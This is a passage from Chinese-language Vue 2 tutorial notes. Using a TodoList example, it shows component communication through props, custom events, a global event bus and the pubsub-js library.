    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        props: [ 'getSchoolName' ],
        data() {
            return {
                name: '学校',
                address: '地址'
            }
        },
        methods: {
            sendSchoolName(){
                // 调用父组件传递过来的函数
                this.getSchoolName(this.name);
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: #ecbb7f;
    }
</style>
```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <!-- 通过父组件给子组件传递函数类型的 props 实现：子组件给父组件传递数据 -->
        <School :getSchoolName="getSchoolName" />

        <hr>

        <!-- 通过父组件给子组件绑定一个自定义事件实现：子组件给父组件传递数据 -->
        <Student @yuehai="getStudentName" @getSex="getSex"/>
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student },
        methods: {
            getSchoolName(name){
                console.log(`接收到子组件传递的学校名：${name}`)
            },
            getStudentName(name){
                console.log(`接收到子组件传递的学生名：${name}`)
            },
            getSex(sex){
                console.log(`接收到子组件传递的性别：${sex}`);
            }
        }
    }
</script>

<style>
    /* css 样式 */
</style>
```

---

TodoList 案例

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
}).$mount('#app')

```

```vue
<template>
    <!-- 在网页中引入组件 -->
    <div class="todo-container">
        <div class="todo-wrap">
            <!-- 传递参数与函数 -->
            <ToDoHeader :todos="todos" @receive="receive" />
            <ToDoList :todos="todos" @checkTodo="checkTodo" @deleteTodo="deleteTodo" />
            <ToDoFooter :todos="todos" @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>

        </div>
    </div>
</template>

<script>
    // js 引入组件
    import ToDoHeader from "./components/ToDoHeader.vue"
    import ToDoList from "./components/ToDoList.vue"
    import ToDoFooter from "./components/ToDoFooter.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { ToDoHeader, ToDoList, ToDoFooter },
        data(){
            return {
                // 从本地存储中读取数据，本地存储中没有数据则创建空数组
                todos: JSON.parse(localStorage.getItem("todos")) || []
            }
        },
        methods: {
            // 接收子组件传递过来的对象，添加到数组中
            receive(todo){
                // 将接收的对象放入 todos 数组
                this.todos.push(todo)
            },
            // 接收子组件传递过来的 id，将 done 取反
            checkTodo(id){
                this.todos.forEach((todo)=>{
                    if (todo.id === id){
                        todo.done = !todo.done;
                    }
                })
            },
            // 接收子组件传递过来的 id，删除对应的 todo
            deleteTodo(id){
                this.todos = this.todos.filter((todo)=>{
                    return todo.id !== id;
                })
            },
            // 全选/取消全选
            checkAllTodo(done){
                this.todos.forEach((todo)=>{
                    todo.done = done;
                })
            },
            // 清除已完成任务
            clearAllTodo(){
                this.todos = this.todos.filter((todo)=>{
                    return !todo.done;
                })
            }
        },
        watch: {
            // 当数据改变时，将数据存入本地存储，监视属性的完整形式
            todos: {
                // 开启深度监视
                deep: true,
                handler(value){
                    localStorage.setItem("todos", JSON.stringify(value));
                }
            }
        }
    }
</script>

<style lang="less">
    /* css 样式 */
    body {
        background: #fff;

        .todo-container {
            width: 400px;
            margin: 0 auto;

            .todo-wrap {
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }

        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-header">
        <!-- 调用 add 函数，回车键触发 -->
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
    </div>
</template>

<script>
// js 代码
export default {
    // 给组件起一个名称（可以省略）
    name: 'ToDoHeader',
    props: [ 'todos' ],
    methods: {
        add(value){
            let id = 0;
            // 判断数组是否为空
            if (this.todos.length !== 0){
                // 获取数组中最后一个元素，取 id，转为整数 + 1，再转为字符串
                id = String(Number(this.todos[this.todos.length - 1].id) + 1);
            }
            // 加 0
            while (id.length<3){
                id = "0" + id;
            }
            // 创建对像
            let todo = {
                id: id,
                title: value.target.value,
                done: false
            }

            // 调用父组件传递过来的函数，传递对象
            this.$emit("receive", todo);

            // 清空输入框
            value.target.value = '';
        }
    }
}
</script>

<style scoped lang="less">
    /* css 样式 */
    /*header*/
    .todo-header {
        input {
            width: 360px;
            height: 28px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 4px 7px;
        }

        .todo-header input:focus {
            outline: none;
            border-color: rgba(82, 168, 236, 0.8);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <ul class="todo-main">
        <!-- 循环 -->
        <li v-for="todo in todos" :key=todo.id>
            <label>
                <!--
                    可以将 :checked="todo.done" 和 @change="headerCheck(todo.id) 替换为 :v-model="todo.done"，但是不建议，因为修改了 props
                    @change：改变事件
                -->
                <input type="checkbox" :checked="todo.done" @change="headerCheck(todo.id)"/>
                <span>{{ todo.title }}</span>
            </label>
            <button class="btn btn-danger" @click="headerDelete(todo.id)">删除</button>
        </li>
    </ul>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoList',
        props: [ 'todos' ],
        methods: {
            // 勾选
            headerCheck(id){
                // 传递 id ，通知 App 组件将对应的 todo 对象的 done 取反
                this.$emit("checkTodo", id);
            },
            // 删除
            headerDelete(id){
                // 根据用户选择返回布尔值
                if (confirm('确定要删除吗？')){
                    // 传递 id ，通知 App 组件将对应的 todo 对象删除
                    this.$emit("deleteTodo", id);
                }
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*main*/
    .todo-main {
        margin-left: 0px;
        border: 1px solid #ddd;
        border-radius: 2px;
        padding: 0px;

        /*item*/
        li {
            list-style: none;
            height: 36px;
            line-height: 36px;
            padding: 0 5px;
            border-bottom: 1px solid #ddd;
        }
        li label {
            float: left;
            cursor: pointer;
        }
        li label li input {
            vertical-align: middle;
            margin-right: 6px;
            position: relative;
            top: -1px;
        }
        li button {
            float: right;
            display: none;
            margin-top: 3px;
        }
        li:before {
            content: initial;
        }
        li:last-child {
            border-bottom: none;
        }
        li:hover{
            background-color: #ddd;
        }
        li:hover button{
            display: block;
        }

        .btn {
            //display: inline-block;
            padding: 4px 12px;
            margin-bottom: 0;
            font-size: 14px;
            line-height: 20px;
            text-align: center;
            vertical-align: middle;
            cursor: pointer;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            border-radius: 4px;
        }
        .btn-danger {
            color: #fff;
            background-color: #da4f49;
            border: 1px solid #bd362f;
        }
        .btn-danger:hover {
            color: #fff;
            background-color: #bd362f;
        }
        .btn:focus {
            outline: none;
        }
    }

</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-footer" v-show="todos.length">
        <label>
            <input type="checkbox" v-model="isAll"/>
        </label>
        <span>
            <span>已完成{{doneTotal}}</span> / 全部{{todos.length}}
        </span>
        <button class="btn btn-danger" @click="clearAllTodo">清除已完成任务</button>
    </div>
</template>

<script>
// js 代码
export default {
    // 给组件起一个名称（可以省略）
    name: 'ToDoFooter',
    props: [ 'todos' ],
    methods: {
        // 清除已完成任务
        clearAllTodo(){
            this.$emit("clearAllTodo");
        }
    },
    computed: {
        // 返回已选择数据的数量
        doneTotal(){
            /**
             * reduce() 方法：
             * 参数 1：函数，数组有几个值，就会调用几次
             *      参数 1：pre：当前值；第一次调用该函数的返回值，作为第二次调用该函数的 pre 的值
             *      参数 2：current：本次遍历的元素
             * 参数 2：统计开始的初始值
             */
            return this.todos.reduce((pre, current)=>{
                return pre + ( current.done ? 1 : 0 )
            }, 0)
        },
        // 判断是否全选，弱受上方全选则勾选；否则不勾选
        isAll: {
            // 读取展示
            get(){
                return this.doneTotal === this.todos.length && this.todos.length > 0;
            },
            // 传递是否选择，通知 App 组件将对应的 todo 对象的 done 值修改
            set(value){
                this.$emit("checkAllTodo", value);
            }
        }
    }
}
</script>

<style scoped lang="less">
    /* css 样式 */
    /*footer*/
    .todo-footer {
        height: 40px;
        line-height: 40px;
        padding-left: 6px;
        margin-top: 5px;

        label {
            display: inline-block;
            margin-right: 20px;
            cursor: pointer;

            input {
                position: relative;
                top: -1px;
                vertical-align: middle;
                margin-right: 5px;
            }
        }

        button {
            float: right;
            margin-top: 5px;
        }

        .btn {
            display: inline-block;
            padding: 4px 12px;
            margin-bottom: 0;
            font-size: 14px;
            line-height: 20px;
            text-align: center;
            vertical-align: middle;
            cursor: pointer;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            border-radius: 4px;
        }
        .btn-danger {
            color: #fff;
            background-color: #da4f49;
            border: 1px solid #bd362f;
        }
        .btn-danger:hover {
            color: #fff;
            background-color: #bd362f;
        }
        .btn:focus {
            outline: none;
        }
    }

</style>
```

## 12、全局事件总线

Vue3 中 $on 和 $off 已被移除，若是使用事件总线可以使用 mitt

1.  一种组件间通信的方式，适用于任意组件间通信。 
2.  安装全局事件总线： 

```javascript
new Vue({
	......
	beforeCreate() {
		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
	},
    ......
})
```

3.  使用事件总线： 
   1.  接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。 `this.$bus.$on("xxx", 函数);`

```javascript
methods(){
  demo(data){......}
}
......
mounted() {
  this.$bus.$on('xxxx',this.demo)
}
```

   2.  提供数据：`this.$bus.$emit('xxxx',数据)` 
4.  最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件。 
5. 一般来说，并不是所有事件都要用到全局事件总线；只有一级组件给三级及以下组件传递时才需要使用。

---

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 安装全局事件总线，将该总 vue 实例挂载到 $bus 这个vc 实例上，再将 $bus 挂载到总 vue 实例上
    beforeCreate() {
        Vue.prototype.$bus = this;
    }
}).$mount('#app')

```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <School/>

        <hr>

        <Student/>
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2 class="demoName">学校名称：{{name}}</h2>
        <h2 class="demoAddress">学校地址：{{address}}</h2>
    </div>
</template>

<script>
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        props: [ 'getSchoolName' ],
        data() {
            return {
                name: '学校',
                address: '地址'
            }
        },

        // 挂载时接收数据
        mounted() {
            this.$bus.$on("hello", (data)=>{
                console.log(`学校收到了数据：${data}`)
            });
        },
        // 在 vc 实例销毁时解绑该事件
        beforeDestroy() {
            this.$bus.$off();
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: #ecbb7f;
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2>姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>

        <button @click="sendName">发送命名</button>
    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        },

        // 提供数据
        methods: {
            sendName(){
                this.$bus.$emit("hello", this.name);
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

---

TodoList 案例

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 安装全局事件总线，将该总 vue 实例挂载到 $bus 这个vc 实例上，再将 $bus 挂载到总 vue 实例上
    beforeCreate() {
        Vue.prototype.$bus = this;
    }
}).$mount('#app')

```

```vue
<template>
    <!-- 在网页中引入组件 -->
    <div class="todo-container">
        <div class="todo-wrap">
            <!-- 传递参数与函数 -->
            <ToDoHeader :todos="todos" />
            <ToDoList :todos="todos" />
            <ToDoFooter :todos="todos" />

        </div>
    </div>
</template>

<script>
    // js 引入组件
    import ToDoHeader from "./components/ToDoHeader.vue"
    import ToDoList from "./components/ToDoList.vue"
    import ToDoFooter from "./components/ToDoFooter.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { ToDoHeader, ToDoList, ToDoFooter },
        data(){
            return {
                // 从本地存储中读取数据，本地存储中没有数据则创建空数组
                todos: JSON.parse(localStorage.getItem("todos")) || []
            }
        },
        methods: {
            // 接收子组件传递过来的对象，添加到数组中
            receive(todo){
                // 将接收的对象放入 todos 数组
                this.todos.push(todo)
            },
            // 接收子组件传递过来的 id，将 done 取反
            checkTodo(id){
                this.todos.forEach((todo)=>{
                    if (todo.id === id){
                        todo.done = !todo.done;
                    }
                })
            },
            // 接收子组件传递过来的 id，删除对应的 todo
            deleteTodo(id){
                this.todos = this.todos.filter((todo)=>{
                    return todo.id !== id;
                })
            },
            // 全选/取消全选
            checkAllTodo(done){
                this.todos.forEach((todo)=>{
                    todo.done = done;
                })
            },
            // 清除已完成任务
            clearAllTodo(){
                this.todos = this.todos.filter((todo)=>{
                    return !todo.done;
                })
            }
        },
        watch: {
            // 当数据改变时，将数据存入本地存储，监视属性的完整形式
            todos: {
                // 开启深度监视
                deep: true,
                handler(value){
                    localStorage.setItem("todos", JSON.stringify(value));
                }
            }
        },
        mounted() {
            // 挂载时绑定事件
            this.$bus.$on("receive", this.receive);
            this.$bus.$on("checkTodo", this.checkTodo);
            this.$bus.$on("deleteTodo", this.deleteTodo);
            this.$bus.$on("checkAllTodo", this.checkAllTodo);
            this.$bus.$on("clearAllTodo", this.clearAllTodo);
        },
        beforeDestroy() {
            // 销毁时解绑事件
            this.$bus.$off("receive");
            this.$bus.$off("checkTodo");
            this.$bus.$off("deleteTodo");
            this.$bus.$off("checkAllTodo");
            this.$bus.$off("clearAllTodo");
        }
    }
</script>

<style lang="less">
    /* css 样式 */
    body {
        background: #fff;

        .todo-container {
            width: 400px;
            margin: 0 auto;

            .todo-wrap {
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }

        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-header">
        <!-- 调用 add 函数，回车键触发 -->
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
    </div>
</template>

<script>
// js 代码
export default {
    // 给组件起一个名称（可以省略）
    name: 'ToDoHeader',
    props: [ 'todos' ],
    methods: {
        add(value){
            let id = 0;
            // 判断数组是否为空
            if (this.todos.length !== 0){
                // 获取数组中最后一个元素，取 id，转为整数 + 1，再转为字符串
                id = String(Number(this.todos[this.todos.length - 1].id) + 1);
            }
            // 加 0
            while (id.length<3){
                id = "0" + id;
            }
            // 创建对像
            let todo = {
                id: id,
                title: value.target.value,
                done: false
            }

            // 调用父组件传递过来的函数，传递对象
            this.$bus.$emit("receive", todo);

            // 清空输入框
            value.target.value = '';
        }
    }
}
</script>

<style scoped lang="less">
    /* css 样式 */
    /*header*/
    .todo-header {
        input {
            width: 360px;
            height: 28px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 4px 7px;
        }

        .todo-header input:focus {
            outline: none;
            border-color: rgba(82, 168, 236, 0.8);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <ul class="todo-main">
        <!-- 循环 -->
        <li v-for="todo in todos" :key=todo.id>
            <label>
                <!--
                    可以将 :checked="todo.done" 和 @change="headerCheck(todo.id) 替换为 :v-model="todo.done"，但是不建议，因为修改了 props
                    @change：改变事件
                -->
                <input type="checkbox" :checked="todo.done" @change="headerCheck(todo.id)"/>
                <span>{{ todo.title }}</span>
            </label>
            <button class="btn btn-danger" @click="headerDelete(todo.id)">删除</button>
        </li>
    </ul>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoList',
        props: [ 'todos' ],
        methods: {
            // 勾选
            headerCheck(id){
                // 传递 id ，通知 App 组件将对应的 todo 对象的 done 取反
                this.$bus.$emit("checkTodo", id);
            },
            // 删除
            headerDelete(id){
                // 根据用户选择返回布尔值
                if (confirm('确定要删除吗？')){
                    // 传递 id ，通知 App 组件将对应的 todo 对象删除
                    this.$bus.$emit("deleteTodo", id);
                }
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*main*/
    .todo-main {
        margin-left: 0px;
        border: 1px solid #ddd;
        border-radius: 2px;
        padding: 0px;

        /*item*/
        li {
            list-style: none;
            height: 36px;
            line-height: 36px;
            padding: 0 5px;
            border-bottom: 1px solid #ddd;
        }
        li label {
            float: left;
            cursor: pointer;
        }
        li label li input {
            vertical-align: middle;
            margin-right: 6px;
            position: relative;
            top: -1px;
        }
        li button {
            float: right;
            display: none;
            margin-top: 3px;
        }
        li:before {
            content: initial;
        }
        li:last-child {
            border-bottom: none;
        }
        li:hover{
            background-color: #ddd;
        }
        li:hover button{
            display: block;
        }

        .btn {
            //display: inline-block;
            padding: 4px 12px;
            margin-bottom: 0;
            font-size: 14px;
            line-height: 20px;
            text-align: center;
            vertical-align: middle;
            cursor: pointer;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            border-radius: 4px;
        }
        .btn-danger {
            color: #fff;
            background-color: #da4f49;
            border: 1px solid #bd362f;
        }
        .btn-danger:hover {
            color: #fff;
            background-color: #bd362f;
        }
        .btn:focus {
            outline: none;
        }
    }

</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-footer" v-show="todos.length">
        <label>
            <input type="checkbox" v-model="isAll"/>
        </label>
        <span>
            <span>已完成{{doneTotal}}</span> / 全部{{todos.length}}
        </span>
        <button class="btn btn-danger" @click="clearAllTodo">清除已完成任务</button>
    </div>
</template>

<script>
// js 代码
export default {
    // 给组件起一个名称（可以省略）
    name: 'ToDoFooter',
    props: [ 'todos' ],
    methods: {
        // 清除已完成任务
        clearAllTodo(){
            this.$bus.$emit("clearAllTodo");
        }
    },
    computed: {
        // 返回已选择数据的数量
        doneTotal(){
            /**
             * reduce() 方法：
             * 参数 1：函数，数组有几个值，就会调用几次
             *      参数 1：pre：当前值；第一次调用该函数的返回值，作为第二次调用该函数的 pre 的值
             *      参数 2：current：本次遍历的元素
             * 参数 2：统计开始的初始值
             */
            return this.todos.reduce((pre, current)=>{
                return pre + ( current.done ? 1 : 0 )
            }, 0)
        },
        // 判断是否全选，弱受上方全选则勾选；否则不勾选
        isAll: {
            // 读取展示
            get(){
                return this.doneTotal === this.todos.length && this.todos.length > 0;
            },
            // 传递是否选择，通知 App 组件将对应的 todo 对象的 done 值修改
            set(value){
                this.$bus.$emit("checkAllTodo", value);
            }
        }
    }
}
</script>

<style scoped lang="less">
    /* css 样式 */
    /*footer*/
    .todo-footer {
        height: 40px;
        line-height: 40px;
        padding-left: 6px;
        margin-top: 5px;

        label {
            display: inline-block;
            margin-right: 20px;
            cursor: pointer;

            input {
                position: relative;
                top: -1px;
                vertical-align: middle;
                margin-right: 5px;
            }
        }

        button {
            float: right;
            margin-top: 5px;
        }

        .btn {
            display: inline-block;
            padding: 4px 12px;
            margin-bottom: 0;
            font-size: 14px;
            line-height: 20px;
            text-align: center;
            vertical-align: middle;
            cursor: pointer;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            border-radius: 4px;
        }
        .btn-danger {
            color: #fff;
            background-color: #da4f49;
            border: 1px solid #bd362f;
        }
        .btn-danger:hover {
            color: #fff;
            background-color: #bd362f;
        }
        .btn:focus {
            outline: none;
        }
    }


</style>
```

## 13、消息订阅与发布 pubsub

- **全局事件总线的实现库**
1.  一种组件间通信的方式，适用于任意组件间通信。 
2.  使用步骤： 
   1.  安装pubsub：`npm i pubsub-js` 
   2.  引入: `import pubsub from 'pubsub-js'` 
   3.  接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身。 

```javascript
methods(){
  demo(data){......}
}
......
mounted() {
  this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
}
```

   4.  提供数据：`pubsub.publish('xxx',数据)` 
   5.  最好在 beforeDestroy 钩子中，用`PubSub.unsubscribe(pid)`去取消订阅。 

---

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-59-775--pwFMkhQI1NiJCw.png)

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 安装全局事件总线，将该总 vue 实例挂载到 $bus 这个vc 实例上，再将 $bus 挂载到总 vue 实例上
    beforeCreate() {
        Vue.prototype.$bus = this;
    }
}).$mount('#app')

```

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <School/>

        <hr>

        <Student/>
    </div>
</template>

<script>
    // js 引入组件
    import School from "./components/School.vue"
    import Student from "./components/Student.vue"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { School, Student }
    }
</script>

<style>
    /* css 样式 */
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2 class="demoName">学校名称：{{name}}</h2>
        <h2 class="demoAddress">学校地址：{{address}}</h2>
    </div>
</template>

<script>
    import pubsub from 'pubsub-js'
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'School',
        props: [ 'getSchoolName' ],
        data() {
            return {
                name: '学校',
                address: '地址'
            }
        },

        // 挂载时接收数据
        mounted() {
            // 使用 pubsub-js 进行消息订阅；pubsub.subscribe("xxx", (消息名, 数据)=>{})
            // 将其返回的 id 挂载到 this 上，以便进行取消订阅；
            this.punId = pubsub.subscribe("hello", (msgName, data)=>{
                console.log(`接收到的消息名：${msgName}，数据：${data}`)
            })
            // this.$bus.$on("hello", (data)=>{
            //     console.log(`学校收到了数据：${data}`)
            // });
        },
        // 在 vc 实例销毁时解绑该事件
        beforeDestroy() {
            // 使用 pubsub-js 取消订阅，使用使用 pubsub 的 id 进行取消
            pubsub.unsubscribe(this.punId);
            // this.$bus.$off();
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: #ecbb7f;
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="demo">
        <h2>姓名：{{name}}</h2>
        <h2>性别：{{sex}}</h2>
        <h2>年龄：{{age}}</h2>

        <button @click="sendName">发送命名</button>
    </div>
</template>

<script>
    import pubsub from 'pubsub-js'
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Student',
        data() {
            return {
                name: "月海",
                sex: 0,
                age: 16
            }
        },

        // 挂载时提供数据
        methods: {
            sendName(){
                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);
                pubsub.publish("hello", this.name);
                // this.$bus.$emit("hello", this.name);
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

---

TodoList 案例，并添加编辑

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App)
}).$mount('#app')

```

```vue
<template>
    <!-- 在网页中引入组件 -->
    <div class="todo-container">
        <div class="todo-wrap">
            <!-- 传递参数与函数 -->
            <ToDoHeader :todos="todos" />
            <ToDoList :todos="todos" />
            <ToDoFooter :todos="todos" />

        </div>
    </div>
</template>

<script>
    // js 引入组件
    import ToDoHeader from "./components/ToDoHeader.vue"
    import ToDoList from "./components/ToDoList.vue"
    import ToDoFooter from "./components/ToDoFooter.vue"
    import PubSub from "pubsub-js"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { ToDoHeader, ToDoList, ToDoFooter },
        data(){
            return {
                // 从本地存储中读取数据，本地存储中没有数据则创建空数组
                todos: JSON.parse(localStorage.getItem("todos")) || []
            }
        },
        methods: {
            // 接收子组件传递过来的对象，添加到数组中
            // 因为 PubSub 传递过来的时两个参数，而我们只需要第二个参数，所以可以使用 _ 对第一个参数进行占位
            receive(_, todo){
                // 将接收的对象放入 todos 数组
                this.todos.push(todo)
            },
            // 接收子组件传递过来的 id，将 done 取反
            checkTodo(_, id){
                this.todos.forEach((todo)=>{
                    if (todo.id === id){
                        todo.done = !todo.done;
                    }
                })
            },
            // 接收子组件传递过来的 id，删除对应的 todo
            deleteTodo(_, id){
                this.todos = this.todos.filter((todo)=>{
                    return todo.id !== id;
                })
            },
            // 全选/取消全选
            checkAllTodo(_, done){
                this.todos.forEach((todo)=>{
                    todo.done = done;
                })
            },
            // 清除已完成任务
            clearAllTodo(){
                this.todos = this.todos.filter((todo)=>{
                    return !todo.done;
                })
            },
            // 编辑
            updateTodo(_, arr){
                this.todos.forEach((todo)=>{
                    if (todo.id === arr[0]){
                        todo.title = arr[1];
                    }
                })
            }
        },
        watch: {
            // 当数据改变时，将数据存入本地存储，监视属性的完整形式
            todos: {
                // 开启深度监视
                deep: true,
                handler(value){
                    localStorage.setItem("todos", JSON.stringify(value));
                }
            }
        },
        mounted() {
            // 使用 pubsub-js 进行消息订阅；pubsub.subscribe("xxx", (消息名, 数据)=>{})
            // 将其返回的 id 挂载到 this 上，以便进行取消订阅；
            this.pubReceiveId = PubSub.subscribe("receive", this.receive);
            this.pubCheckTodoId = PubSub.subscribe("checkTodo", this.checkTodo);
            this.pubDeleteTodoId = PubSub.subscribe("deleteTodo", this.deleteTodo);
            this.pubCheckAllTodoId = PubSub.subscribe("checkAllTodo", this.checkAllTodo);
            this.pubClearAllTodoId = PubSub.subscribe("clearAllTodo", this.clearAllTodo);
            this.pubUpdateTodoId = PubSub.subscribe("updateTodo", this.updateTodo);
        },
        beforeDestroy() {
            // 用 pubsub-js 取消订阅，使用使用 pubsub 的 id 进行取消
            PubSub.unsubscribe(this.pubReceiveId);
            PubSub.unsubscribe(this.pubCheckTodoId);
            PubSub.unsubscribe(this.pubDeleteTodoId);
            PubSub.unsubscribe(this.pubCheckAllTodoId);
            PubSub.unsubscribe(this.pubClearAllTodoId);
            PubSub.unsubscribe(this.pubUpdateTodoId);
        }
    }
</script>

<style lang="less">
    /* css 样式 */
    body {
        background: #fff;

        .todo-container {
            width: 400px;
            margin: 0 auto;

            .todo-wrap {
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }
        }

        .btn {
            display: inline-block;
            padding: 4px 12px;
            margin-bottom: 0;
            font-size: 14px;
            line-height: 20px;
            text-align: center;
            vertical-align: middle;
            cursor: pointer;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            border-radius: 4px;
        }
        .btn:focus {
            outline: none;
        }
        .btn-danger {
            color: #fff;
            background-color: #da4f49;
            border: 1px solid #bd362f;
        }
        .btn-danger:hover {
            color: #fff;
            background-color: #bd362f;
        }
        .btn-edit{
            color: #fff;
            background-color: #90d4f1;
            border: 1px solid rgb(103, 159, 180);
            margin-right: 5px;
        }
        .btn-edit:hover {
            color: #fff;
            background-color: #7db3cc;
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-header">
        <!-- 调用 add 函数，回车键触发 -->
